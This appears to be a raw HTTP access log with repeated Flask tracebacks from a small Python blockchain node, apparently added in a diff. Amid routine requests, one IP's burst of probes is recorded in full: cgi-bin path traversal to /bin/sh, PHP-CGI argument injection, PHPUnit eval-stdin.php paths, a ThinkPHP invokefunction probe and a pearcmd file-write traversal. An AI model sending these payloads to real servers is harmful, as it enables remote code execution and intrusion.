+141.255.166.90 - - [07/Feb/2025 03:56:16] "GET / HTTP/1.1" 200 -
+176.113.115.249 - - [07/Feb/2025 04:15:11] "GET / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:18:06] "GET / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:22:43] "HEAD / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:22:44] "GET / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:23:10] "GET / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:23:21] "GET / HTTP/1.1" 200 -
+51.161.134.48 - - [07/Feb/2025 04:24:13] "GET /favicon.ico HTTP/1.1" 404 -
+80.82.77.202 - - [07/Feb/2025 04:38:38] "GET / HTTP/1.0" 200 -
+45.149.241.61 - - [07/Feb/2025 05:21:09] "HEAD / HTTP/1.1" 200 -
+45.149.241.61 - - [07/Feb/2025 05:21:09] "GET / HTTP/1.1" 200 -
+198.235.24.200 - - [07/Feb/2025 05:24:48] "GET / HTTP/1.1" 200 -
+46.19.138.234 - - [07/Feb/2025 06:21:44] "GET / HTTP/1.1" 200 -
+176.53.223.63 - - [07/Feb/2025 06:33:10] "GET / HTTP/1.1" 200 -
+89.104.100.123 - - [07/Feb/2025 06:33:10] "GET /favicon.ico HTTP/1.1" 404 -
+179.43.191.146 - - [07/Feb/2025 06:58:34] "GET / HTTP/1.1" 200 -
+95.214.55.43 - - [07/Feb/2025 07:09:25] "GET / HTTP/1.1" 200 -
+45.149.241.61 - - [07/Feb/2025 07:10:21] "GET / HTTP/1.1" 200 -
+54.196.107.102 - - [07/Feb/2025 07:45:36] "GET / HTTP/1.1" 200 -
+54.196.107.102 - - [07/Feb/2025 07:45:36] "GET /favicon.ico HTTP/1.1" 404 -
+54.196.107.102 - - [07/Feb/2025 07:45:40] "GET /favicon.ico HTTP/1.1" 404 -
+152.32.225.3 - - [07/Feb/2025 07:48:01] "GET / HTTP/1.1" 200 -
+172.69.136.174 - - [07/Feb/2025 07:52:12] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+172.70.247.189 - - [07/Feb/2025 07:52:21] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+107.173.151.28 - - [07/Feb/2025 08:01:58] "GET / HTTP/1.1" 200 -
+107.173.151.28 - - [07/Feb/2025 08:01:58] "GET /favicon.ico HTTP/1.1" 404 -
+104.252.31.22 - - [07/Feb/2025 08:02:06] "GET / HTTP/1.1" 200 -
+104.252.31.22 - - [07/Feb/2025 08:02:06] "GET /favicon.ico HTTP/1.1" 404 -
+104.253.214.203 - - [07/Feb/2025 08:02:15] "GET / HTTP/1.1" 200 -
+104.253.214.203 - - [07/Feb/2025 08:02:16] "GET /favicon.ico HTTP/1.1" 404 -
+104.253.203.112 - - [07/Feb/2025 08:02:25] "GET / HTTP/1.1" 200 -
+104.253.203.112 - - [07/Feb/2025 08:02:26] "GET /favicon.ico HTTP/1.1" 404 -
+107.173.151.70 - - [07/Feb/2025 08:02:38] "GET / HTTP/1.1" 200 -
+107.173.151.70 - - [07/Feb/2025 08:02:38] "GET /favicon.ico HTTP/1.1" 404 -
+172.70.246.3 - - [07/Feb/2025 08:12:33] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+141.101.76.28 - - [07/Feb/2025 08:13:54] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+45.149.241.61 - - [07/Feb/2025 08:22:53] "GET / HTTP/1.1" 200 -
+141.255.166.90 - - [07/Feb/2025 08:23:33] "GET / HTTP/1.1" 200 -
+43.153.35.128 - - [07/Feb/2025 08:23:42] "GET / HTTP/1.1" 200 -
+75.119.138.110 - - [07/Feb/2025 08:25:39] "POST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:39] "POST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:39] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:39] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:40] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:40] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:40] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:40] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:40] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:41] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:42] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:43] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:44] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:45] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 -
+75.119.138.110 - - [07/Feb/2025 08:25:46] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 -
+172.70.46.11 - - [07/Feb/2025 08:34:22] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 -
+172.71.164.28 - - [07/Feb/2025 08:35:14] "GET /wp-admin/setup-config.php HTTP/1.1" 404 -
+156.248.90.63 - - [07/Feb/2025 08:36:30] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [07/Feb/2025 08:38:03] "POST /nodes/register HTTP/1.1" 415 -
+217.80.134.196 - - [07/Feb/2025 08:38:15] "POST /nodes/register HTTP/1.1" 415 -
+217.80.134.196 - - [07/Feb/2025 08:38:22] "POST /nodes/register HTTP/1.1" 415 -
+217.80.134.196 - - [07/Feb/2025 08:38:50] "POST /nodes/register HTTP/1.1" 415 -
+185.190.24.101 - - [07/Feb/2025 08:39:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.190.24.101 - - [07/Feb/2025 08:39:33] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 -
+217.80.134.196 - - [07/Feb/2025 08:40:09] "POST /nodes/register HTTP/1.1" 415 -
+217.80.134.196 - - [07/Feb/2025 08:40:17] "POST /nodes/register HTTP/1.1" 415 -
+217.80.134.196 - - [07/Feb/2025 08:40:40] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:40:55] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:41:04] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:41:12] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:41:18] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:41:22] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:43:12] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:43:52] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:44:06] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:44:14] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:45:19] "POST /nodes/register HTTP/1.1" 400 -
+217.80.134.196 - - [07/Feb/2025 08:45:26] "POST /nodes/register HTTP/1.1" 400 -
+54.86.50.139 - - [07/Feb/2025 08:48:04] "POST /nodes/register?nodes:=http://localhost:5000 HTTP/1.1" 415 -
+54.86.50.139 - - [07/Feb/2025 08:48:23] "POST /nodes/register?nodes:=[http://localhost:5000] HTTP/1.1" 415 -
+54.86.50.139 - - [07/Feb/2025 08:48:53] "POST /nodes/register HTTP/1.1" 415 -
+54.86.50.139 - - [07/Feb/2025 08:49:12] "POST /nodes/register HTTP/1.1" 415 -
+54.86.50.139 - - [07/Feb/2025 08:49:46] "POST /nodes/register HTTP/1.1" 201 -
+[2025-02-07 08:50:25,080] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8edb800>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8edb800>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8edb800>: Failed to establish a new connection: [Errno 111] Connection refused'))
+54.86.50.139 - - [07/Feb/2025 08:50:25] "GET /nodes/resolve HTTP/1.1" 500 -
+[2025-02-07 08:50:33,346] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8f529f0>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f529f0>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f529f0>: Failed to establish a new connection: [Errno 111] Connection refused'))
+54.86.50.139 - - [07/Feb/2025 08:50:33] "GET /nodes/resolve HTTP/1.1" 500 -
+[2025-02-07 08:50:35,052] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 218, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x72c9e8f67f50>: Failed to establish a new connection: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 845, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 515, in increment
+    if new_retry.is_exhausted():
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f67f50>: Failed to establish a new connection: [Errno 111] Connection refused'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 277, in consensus
+    replaced = blockchain.resolve_conflicts()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/schndr/schndr_blockchain.py", line 83, in resolve_conflicts
+    response = requests.get(f'http://{node}/chain')
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='localhost', port=5000): Max retries exceeded with url: /chain (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x72c9e8f67f50>: Failed to establish a new connection: [Errno 111] Connection refused'))
+54.86.50.139 - - [07/Feb/2025 08:50:35] "GET /nodes/resolve HTTP/1.1" 500 -
+[2025-02-07 08:51:22,726] ERROR in app: Exception on /nodes/resolve [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 203, in _new_conn
+    sock = connection.create_connection(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 85, in create_connection
+    raise err
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 791, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 497, in _make_request
+    conn.request(
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 395, in request
+    self.endheaders()
+  File "/usr/lib/python3.12/http/client.py", line 1331, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/usr/lib/python3.12/http/client.py", line 1091, in _send_output
+    self.send(msg)
+  File "/usr/lib/python3.12/http/client.py", line 1035, in send
+    self.connect()
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 243, in connect
+    self.sock = self._new_conn()
+                ^^^^^^^^^^^^^^^^
